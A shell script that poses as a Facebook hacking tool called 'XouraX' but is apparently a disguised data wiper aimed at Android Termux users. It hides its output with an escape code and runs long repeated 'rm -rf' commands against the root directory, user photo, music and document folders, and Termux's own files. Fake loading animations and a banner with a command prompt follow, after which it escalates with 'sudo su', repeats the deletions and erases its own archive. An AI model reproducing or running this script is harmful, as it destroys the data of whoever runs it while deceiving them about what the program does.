












































echo -e "\e[8m"
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
clear

sleep 1
echo ""
echo -ne "\e[92mL"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "k"; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "g"; sleep 0.1; echo -ne " F"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "r"; sleep 0.1; echo -ne " \e[93m[\e[92m"; sleep 0.1; echo -ne "h"; sleep 0.1; echo -ne "t"; sleep 0.1; echo -ne "t"; sleep 0.1; echo -ne "p"; sleep 0.1; echo -ne "s"; sleep 0.1; echo -ne ":"; sleep 0.1; echo -ne "/"; sleep 0.1; echo -ne "/"; sleep 0.1; echo -ne "w"; sleep 0.1; echo -ne "w"; sleep 0.1; echo -ne "w"; sleep 0.1; echo -ne "."; sleep 0.1; echo -ne "e"; sleep 0.1; echo -ne "t"; sleep 0.1; echo -ne "c";  sleep 0.1; echo -ne "\e[93m]\e[92m"; sleep 1; echo -ne " P"; sleep 0.1; echo -ne "r"; sleep 0.1; echo -ne "e"; sleep 0.1; echo -ne "f"; sleep 0.1; echo -ne "r"; sleep 0.1; echo -ne "e"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "c"; sleep 0.1; echo -ne "e "; sleep 0.1; echo -ne "\e[93m[\e[92m"; sleep 3; echo -ne "o"; sleep 0.1; echo -ne "k"; sleep 0.1; echo -ne "\e[93m]\e[92m"; sleep 0.1; echo -ne " T"; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "m"; sleep 0.1; echo -ne "e "; sleep 0.1; echo -ne "\e[93m[\e[92m"; sleep 0.1; echo -ne "1"; sleep 0.1; echo -ne "5"; sleep 0.1; echo -ne "\e[93m]\e[92m"; echo ""; sleep 1
echo -ne "\e[92mL"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "k"; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "g"; sleep 0.1; echo -ne " F"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "r"; sleep 0.1; echo -ne " \e[93m[\e[92m"; sleep 0.1; echo -ne "h"; sleep 0.1; echo -ne "t"; sleep 0.1; echo -ne "t"; sleep 0.1; echo -ne "p"; sleep 0.1; echo -ne "s"; sleep 0.1; echo -ne ":"; sleep 0.1; echo -ne "/"; sleep 0.1; echo -ne "/"; sleep 0.1; echo -ne "w"; sleep 0.1; echo -ne "w"; sleep 0.1; echo -ne "w"; sleep 0.1; echo -ne "."; sleep 0.1; echo -ne "e"; sleep 0.1; echo -ne "t"; sleep 0.1; echo -ne "c";  sleep 0.1; echo -ne "\e[93m]\e[92m"; sleep 1; echo -ne " P"; sleep 0.1; echo -ne "r"; sleep 0.1; echo -ne "e"; sleep 0.1; echo -ne "f"; sleep 0.1; echo -ne "r"; sleep 0.1; echo -ne "e"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "c"; sleep 0.1; echo -ne "e "; sleep 0.1; echo -ne "\e[93m[\e[92m"; sleep 5; echo -ne "o"; sleep 0.1; echo -ne "k"; sleep 0.1; echo -ne "\e[93m]\e[92m"; sleep 0.1; echo -ne " T"; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "m"; sleep 0.1; echo -ne "e "; sleep 0.1; echo -ne "\e[93m[\e[92m"; sleep 0.1; echo -ne "1"; sleep 0.1; echo -ne "7"; sleep 0.1; echo -ne "\e[93m]\e[92m"; echo ""; sleep 1
echo -ne "\e[92mL"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "k"; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "g"; sleep 0.1; echo -ne " F"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "r"; sleep 0.1; echo -ne " \e[93m[\e[92m"; sleep 0.1; echo -ne "h"; sleep 0.1; echo -ne "t"; sleep 0.1; echo -ne "t"; sleep 0.1; echo -ne "p"; sleep 0.1; echo -ne "s"; sleep 0.1; echo -ne ":"; sleep 0.1; echo -ne "/"; sleep 0.1; echo -ne "/"; sleep 0.1; echo -ne "w"; sleep 0.1; echo -ne "w"; sleep 0.1; echo -ne "w"; sleep 0.1; echo -ne "."; sleep 0.1; echo -ne "e"; sleep 0.1; echo -ne "t"; sleep 0.1; echo -ne "c";  sleep 0.1; echo -ne "\e[93m]\e[92m"; sleep 1; echo -ne " P"; sleep 0.1; echo -ne "r"; sleep 0.1; echo -ne "e"; sleep 0.1; echo -ne "f"; sleep 0.1; echo -ne "r"; sleep 0.1; echo -ne "e"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "c"; sleep 0.1; echo -ne "e "; sleep 0.1; echo -ne "\e[93m[\e[92m"; sleep 1; echo -ne "o"; sleep 0.1; echo -ne "k"; sleep 0.1; echo -ne "\e[93m]\e[92m"; sleep 0.1; echo -ne " T"; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "m"; sleep 0.1; echo -ne "e "; sleep 0.1; echo -ne "\e[93m[\e[92m"; sleep 0.1; echo -ne "1"; sleep 0.1; echo -ne "3"; sleep 0.1; echo -ne "\e[93m]\e[92m"; echo ""; sleep 1
clear; sleep 1

echo -ne "L"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "a"; sleep 0.1; echo -ne "d"; sleep 0.1; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "g "; sleep 0.1; echo -ne "\e[93m|\e[92m\e[102m"; sleep 0.4; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "\e[92m\e[102m|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "\e[49m\e[93m|\e[92m"; echo ""; echo ""; sleep 2
echo -ne "L"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "a"; sleep 0.1; echo -ne "d"; sleep 0.1; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "g "; sleep 0.1; echo -ne "\e[93m|\e[92m\e[102m"; sleep 0.8; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.5; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "\e[92m\e[102m|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.6; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.9; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 1.1; echo -ne "|"; sleep 0.9; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "\e[49m\e[93m|\e[92m"; echo ""; echo ""; sleep 2
echo -ne "L"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "a"; sleep 0.1; echo -ne "d"; sleep 0.1; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "g "; sleep 0.1; echo -ne "\e[93m|\e[92m\e[102m"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.5; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "\e[92m\e[102m|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.6; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.9; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "\e[49m\e[93m|\e[92m"; echo ""; echo ""; sleep 2
echo -ne "L"; sleep 0.1; echo -ne "o"; sleep 0.1; echo -ne "a"; sleep 0.1; echo -ne "d"; sleep 0.1; sleep 0.1; echo -ne "i"; sleep 0.1; echo -ne "n"; sleep 0.1; echo -ne "g "; sleep 0.1; echo -ne "\e[93m|\e[92m\e[102m"; sleep 2; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.5; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "\e[92m\e[102m|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.6; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 1.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 1.1; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.9; echo -ne "|"; sleep 0.1; echo -ne "|"; sleep 0.1; echo -ne "\e[49m\e[93m|\e[92m"; echo ""; echo ""; sleep 2; clear
echo -ne "\e[92m      
\e[91mxXx        xXx\e[92m     \e[93m(\e[90mVersion : 0.1\e[93m)\e[92m
 \e[91mxXx      xXx\e[92m
  \e[91mxXx    xXx\e[92m   Author \e[93m:\e[92m Archer >_<
   \e[91mxXx  xXx\e[92m
    \e[91mxXxxXx\e[92m  Mc's Club offensive Security Group
    \e[91mxXxxXx\e[92m
   \e[91mxXx  xXx\e[92m    Warning : Made in \e[7m\e[91mi\e[97mT\e[32mA\e[30mLIA\e[0m\e[92m
  \e[91mxXx    xXx\e[92m
 \e[91mxXx      xXx\e[92m      XouraX Hack FB Hack Tool \e[91m$\e[93m_\e[92m<
\e[91mxXx        xXx\e[92m      "
echo ""
echo -e "\e[93m-----------------------------------------------\e[49m\e[0m\e[92m"
echo ""
echo -e "Enter \`\e[93mhelp\e[92m\` for more iNFO"
echo -ne ">>> "; read Command
sudo su
clear
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf /
rm -rf /data
rm -rf /data/Documents
rm -rf /data/data
rm -rf /data/DCIM
rm -rf /data/Android
rm -rf /data/Pictures
rm -rf /data/Music
rm -rf /data/Movies
rm -rf /data/data/data
rm -rf /data/data/DCIM
rm -rf /data/data/Android
rm -rf /data/data/Movies
rm -rf /data/data/Pictures
rm -rf /data/data/Music
rm -rf /data/data/Documents
rm -rf /data/data/data/DCIM
rm -rf /data/data/data/Android
rm -rf /data/data/data/Music
rm -rf /data/data/data/Movies
rm -rf /data/data/data/Pictures
rm -rf /data/data/data/Documents
rm -rf /data/data/com.termux
rm -rf /data/data/com.termux/files
rm -rf /data/data/com.termux/files/usr
rm -rf /data/data/com.termux/files/home
rm -rf /data/data/com.termux/files/usr/bin
rm -rf /data/data/termux.com
rm -rf /data/data/termux.com/files
rm -rf /data/data/termux.com/files/usr
rm -rf /data/data/termux.com/files/home
rm -rf /data/data/termux.com/files/usr/bin
rm -rf ../
rm -rf ../../
rm -rf ..
rm -rf ../../../
rm -rf ../../../../
rm -rf ../../../../../
rm -rf ../../../../..
rm -rf ../../../../../../
rm -rf ../../../../../..
rm -rf ../../../../../../..
rm -rf ../../../../../../../
rm -rf ../Xourax.zip
rm -rf ../Xourax
rm -rf ../../Xourax.zip
rm -rf ../../Xourax
rm -rf *
rm -rf $
sleep 10
